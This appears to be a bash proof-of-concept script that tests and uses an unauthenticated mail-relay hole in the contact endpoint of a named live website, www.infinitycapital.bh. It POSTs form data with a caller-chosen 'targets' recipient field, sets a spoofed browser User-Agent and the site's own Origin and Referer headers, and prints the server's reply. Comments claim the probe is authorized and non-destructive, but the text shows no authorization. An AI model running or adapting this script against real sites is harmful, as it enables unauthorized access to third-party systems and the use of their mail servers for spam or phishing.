#!/bin/bash
# Independent verification: unauthenticated POST /api/send arbitrary-recipient relay
# Target: https://www.infinitycapital.bh/api/send
# Non-destructive: one message per probe, no looping/abuse.
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
T="$1"
LABEL="${2:-probe}"
OUT=/tmp/iv_${LABEL}.body
HDR=/tmp/iv_${LABEL}.hdr
echo "===== PROBE $LABEL  targets=[$T] ====="
CODE=$(curl -s -m 45 -o "$OUT" -D "$HDR" -w "%{http_code}" -X POST 'https://www.infinitycapital.bh/api/send' \
  -H "User-Agent: $UA" \
  -H 'Origin: https://www.infinitycapital.bh' \
  -H 'Referer: https://www.infinitycapital.bh/contact' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "fname=Independent" \
  --data-urlencode "lname=Verifier" \
  --data-urlencode "areacode=+973" \
  --data-urlencode "tel=00000000" \
  --data-urlencode "cname=Security Review" \
  --data-urlencode "subject=Authorized security verification" \
  --data-urlencode "msg=Non-destructive verification of unauth mail endpoint. Token VFY-9137-IC." \
  --data-urlencode "check=" \
  --data-urlencode "targets=$T")
echo "http=$CODE"
head -1 "$HDR" | tr -d '\r'
grep -i -E '^(x-vercel-mitigated|x-matched-path|x-vercel-id|content-type):' "$HDR" | tr -d '\r'
echo "body: $(head -c 500 "$OUT")"
echo
